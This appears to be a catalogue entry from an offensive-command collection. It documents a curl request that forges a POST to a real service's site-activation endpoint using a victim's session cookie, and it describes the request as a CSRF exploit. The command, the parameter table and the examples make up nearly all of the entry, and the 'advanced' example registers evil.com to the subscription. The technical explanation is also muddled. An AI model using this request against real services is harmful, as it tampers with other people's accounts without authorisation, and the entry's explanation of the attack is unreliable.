---
data: >-
  curl -X POST 'https://akismet.com/api/activation/create' -H 'Cookie:
  session=abc123' -d 'subscriptionId=1&site_url=foo.bar'
tags:
  - csrf
  - web
  - test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:15.497Z'
id: 99258eee-9002-4861-8db5-848d4c710314
verified: false
validated: true
submitted: true
---
# curl-post-csrf-add-site

## Command

```bash
curl -X POST 'https://akismet.com/api/activation/create' -H 'Cookie: session=abc123' -d 'subscriptionId=1&site_url=foo.bar'
```

## Description

Sends a forged POST to add a site to a subscription, exploiting CSRF by bypassing token validation with the victim's session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `https://akismet.com/api/activation/create` | Endpoint for site activation | Yes |
| `-H 'Cookie: session=abc123'` | Session header | Yes |
| `-d 'subscriptionId=1&site_url=foo.bar'` | Parameters for subscription and site | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://akismet.com/api/activation/create' -H 'Cookie: session=abc123' -d 'subscriptionId=1&site_url=foo.bar'
```

### Advanced Usage

```bash
curl -X POST 'https://akismet.com/api/activation/create' -H 'Cookie: session=abc123' -d 'subscriptionId=1&site_url=evil.com' -v
```

## Expected Output

Response confirming site addition to subscription.

## Related

- [[Related Procedure]]
